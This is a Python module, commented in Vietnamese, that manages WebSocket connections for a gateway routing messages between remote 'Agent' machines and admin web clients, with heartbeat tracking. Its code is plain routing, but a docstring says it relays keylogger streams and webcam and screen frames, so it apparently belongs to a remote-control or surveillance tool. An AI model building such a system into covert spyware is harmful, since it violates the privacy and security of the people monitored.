# gateway/core/connection_manager.py
"""
===============================================================================
FILE: gateway/core/connection_manager.py
PURPOSE: Quản lý danh sách kết nối WebSocket (Registry) và định tuyến gói tin.
ARCHITECTURE ROLE:
  - Đóng vai trò Sổ bạ (In-memory Registry) lưu trữ tất cả Socket đang active.
  - Cung cấp cơ chế định tuyến (Routing) gói tin giữa WebApp và Agent tốc độ cao.
  - Quản lý trạng thái Heartbeat để phát hiện sự cố rớt mạng.
===============================================================================
"""

import logging
import time
from typing import Dict, Set, Optional, Any
from websockets.server import WebSocketServerProtocol
from websockets.exceptions import ConnectionClosed

# Import WSMessage Schema đã định nghĩa ở protocol.py
from schemas.protocol import WSMessage

logger = logging.getLogger("Gateway.ConnectionManager")


class ConnectionManager:
    """
    Lớp quản lý tập trung toàn bộ kết nối WebSocket trong Gateway.
    Stateless - Chỉ lưu giữ trạng thái kết nối trong bộ nhớ RAM (In-Memory).
    """

    def __init__(self):
        # Lưu các máy Agent đang kết nối: {machine_id: WebSocket}
        self.active_agents: Dict[str, WebSocketServerProtocol] = {}

        # Lưu các kết nối từ WebApp Admin: Set[WebSocket]
        self.active_webapps: Set[WebSocketServerProtocol] = set()

        # Lưu thời điểm nhận Heartbeat cuối cùng của Agent: {machine_id: unix_timestamp}
        self.agent_heartbeats: Dict[str, float] = {}

    # =========================================================================
    # 1. QUẢN LÝ KẾT NỐI AGENT
    # =========================================================================

    async def register_agent(self, machine_id: str, websocket: WebSocketServerProtocol) -> None:
        """Đăng ký một máy Agent mới vào hệ thống sau khi xác thực thành công."""
        self.active_agents[machine_id] = websocket
        self.agent_heartbeats[machine_id] = time.time()
        logger.info(f"[AGENT CONNECTED] Máy '{machine_id}' đã đăng ký kết nối thành công.")

    async def unregister_agent(self, machine_id: str) -> None:
        """Xóa máy Agent khỏi danh sách quản lý khi ngắt kết nối."""
        if machine_id in self.active_agents:
            del self.active_agents[machine_id]
            self.agent_heartbeats.pop(machine_id, None)
            logger.info(f"[AGENT DISCONNECTED] Máy '{machine_id}' đã ngắt kết nối.")

    def update_agent_heartbeat(self, machine_id: str) -> None:
        """Cập nhật mốc thời gian nhận Heartbeat gần nhất từ Agent."""
        if machine_id in self.active_agents:
            self.agent_heartbeats[machine_id] = time.time()

    def is_agent_online(self, machine_id: str) -> bool:
        """Kiểm tra một máy Agent có đang kết nối Socket hay không."""
        return machine_id in self.active_agents

    # =========================================================================
    # 2. QUẢN LÝ KẾT NỐI WEBAPP (ADMIN)
    # =========================================================================

    async def register_webapp(self, websocket: WebSocketServerProtocol) -> None:
        """Đăng ký một kết nối WebApp Admin mới."""
        self.active_webapps.add(websocket)
        logger.info(f"[WEBAPP CONNECTED] WebApp Admin mới kết nối. Tổng WebApp: {len(self.active_webapps)}")

    async def unregister_webapp(self, websocket: WebSocketServerProtocol) -> None:
        """Xóa kết nối WebApp Admin khi đóng trang web/logout."""
        self.active_webapps.discard(websocket)
        logger.info(f"[WEBAPP DISCONNECTED] Một WebApp ngắt kết nối. Còn lại: {len(self.active_webapps)}")

    # =========================================================================
    # 3. TRUYỀN & ĐỊNH TUYẾN TIN NHẮN (MESSAGE ROUTING)
    # =========================================================================

    async def send_to_agent(self, machine_id: str, raw_message: str) -> bool:
        """
        Gửi chuỗi JSON nguyên vẹn đến một máy Agent chỉ định.
        Returns: True nếu gửi thành công, False nếu máy không Online hoặc lỗi kết nối.
        """
        websocket = self.active_agents.get(machine_id)
        if not websocket:
            logger.warning(f"[SEND FAIL] Không tìm thấy kết nối active cho máy '{machine_id}'.")
            return False

        try:
            await websocket.send(raw_message)
            return True
        except ConnectionClosed:
            logger.error(f"[SEND ERROR] Kết nối tới '{machine_id}' đã bị đóng bất ngờ.")
            await self.unregister_agent(machine_id)
            return False

    async def broadcast_to_webapps(self, raw_message: str) -> None:
        """
        Phát chuỗi JSON tin nhắn đến TẤT CẢ các WebApp Admin đang mở.
        Dùng cho các sự kiện: Keylogger stream, WebCam/Screen frame, Thông báo trạng thái...
        """
        if not self.active_webapps:
            return

        disconnected_webapps = set()
        for ws in self.active_webapps:
            try:
                await ws.send(raw_message)
            except ConnectionClosed:
                disconnected_webapps.add(ws)

        # Dọn dẹp các socket WebApp đã ngắt kết nối
        for ws in disconnected_webapps:
            await self.unregister_webapp(ws)

    async def route_message(self, raw_message: str, parsed_msg: WSMessage) -> bool:
        """
        Hàm định tuyến cốt lõi dựa trên thuộc tính `destination` trong WSMessage Schema.
        
        Args:
            raw_message (str): Chuỗi JSON thô ban đầu (để pass-through tốc độ cao không cần serialize lại).
            parsed_msg (WSMessage): Gói tin Pydantic đã qua parse header.
        """
        destination = parsed_msg.destination

        # Trường hợp 1: Đích đến là WebApp (Frontend)
        if destination == "webapp":
            await self.broadcast_to_webapps(raw_message)
            return True

        # Trường hợp 2: Đích đến là một Agent cụ thể (VD: client-app-01)
        elif destination in self.active_agents:
            return await self.send_to_agent(destination, raw_message)

        # Trường hợp 3: Đích đến là Gateway (Đã được xử lý ở handler cấp cao hơn)
        elif destination == "gateway":
            return True

        else:
            logger.warning(f"[ROUTE FAIL] Đích đến '{destination}' không tồn tại trong Registry.")
            return False

    # =========================================================================
    # 4. QUẢN LÝ TIẾN TRÌNH HEARTBEAT THỜI GIAN THỰC
    # =========================================================================

    def check_dead_connections(self, timeout_seconds: float = 15.0) -> list[str]:
        """
        Quét danh sách các Agent quá 'timeout_seconds' (mặc định 15s - tương đương 3 lần lỡ Heartbeat)
        chưa gửi tín hiệu về Gateway.
        
        Returns: Danh sách các machine_id bị coi là đã ngắt kết nối (Dead/Offline).
        """
        now = time.time()
        dead_agents = []

        for machine_id, last_seen in list(self.agent_heartbeats.items()):
            if now - last_seen > timeout_seconds:
                dead_agents.append(machine_id)

        return dead_agents


# Khởi tạo một Singleton Instance dùng chung cho toàn bộ Gateway
manager = ConnectionManager()